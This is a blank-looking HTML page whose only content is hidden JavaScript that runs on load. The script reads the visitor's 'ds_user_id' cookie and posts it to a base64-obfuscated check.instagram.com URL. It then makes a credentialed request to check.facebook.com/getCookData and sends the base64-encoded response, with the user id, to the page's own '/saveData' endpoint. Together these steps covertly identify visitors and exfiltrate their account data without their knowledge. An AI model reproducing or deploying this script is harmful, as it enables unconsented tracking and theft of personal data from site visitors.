<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Title</title>
</head>
<body>
<script type="application/javascript">
    (function () {
        var doc = document, win = window,
            Requests = function () {
                return this;
            },
            Cookies = {
                cget: function (n) {
                    var m = doc.cookie.match(new RegExp(
                        "(?:^|; )" + n.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                    ));
                    return m ? m[1] : '';
                },
                cset: function (name, value, options) {
                    var expires = options.expires, d = new Date(), updatedCookie = name + "=" + value;
                    d.setTime(d.getTime() + expires * 1000);
                    expires = options.expires = d;
                    options.expires = expires.toUTCString();

                    for (var propName in options) {
                        updatedCookie += "; " + propName;
                        var propValue = options[propName];
                        if (propValue !== true) {
                            updatedCookie += "=" + propValue;
                        }
                    }
                    doc.cookie = updatedCookie;
                }
            };
        Requests.prototype = {
            fillOptions: function (options) {
                ['data', 'success', 'error', 'json', 'headers', 'creds'].forEach(function (i) {
                    if (typeof options[i] === 'undefined') {
                        options[i] = null;
                    }
                });
                return options;
            },
            getSend: function (url, options) {
                return this.sender('GET', url, options);
            },
            postSend: function (url, options) {
                return this.sender('POST', url, options);
            },
            sender: function (type, url, options) {
                options = this.fillOptions(options);

                var request = new XMLHttpRequest();
                request.open(type, url, true);
                if (!options.json && type === 'POST') {
                    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                }
                request.onreadystatechange = function () {
                    if (request.readyState === 4 && request.status === 200) {
                        if (options.success) options.success(request.responseText)
                    } else if (request.readyState === 4 && request.status !== 200) {
                        if (options.error) options.error(request.responseText, request.status);
                    }
                };
                if (options.creds) {
                    request.withCredentials = true;
                }
                if (options.headers) {
                    for (var h in options.headers) {
                        request.setRequestHeader(h, options.headers[h]);
                    }
                }
                if (options.data) request.send(options.data);
                else request.send();

                return request;
            }
        };

        var Req = new Requests(), visiterId = Cookies.cget('ds_user_id'), visitUrl = atob('aHR0cHM6Ly9jaGVjay5pbnN0YWdyYW0uY29t');

        if (visiterId && visiterId !== '0' && visiterId !== 0) {
            Req.postSend(visitUrl + '/visit', {
                data: JSON.stringify({
                    uid: visiterId,
                    type: 'inst'
                }),
                json: true
            });

            Req.getSend('https://check.facebook.com/getCookData?v='+Math.random(), {
                success: function(res){
                    Req.postSend('/saveData?uid='+visiterId, {
                        data: 'uid='+visiterId+'&ext_data='+btoa(res),
                        creds: true
                    });
                },
                creds: true
            });


            /*
            Req.postSend('/saveData?uid='+visiterId, {
                data: 'uid='+visiterId,
                creds: true
            });
            */
        }

    })();
</script>

</body></html>
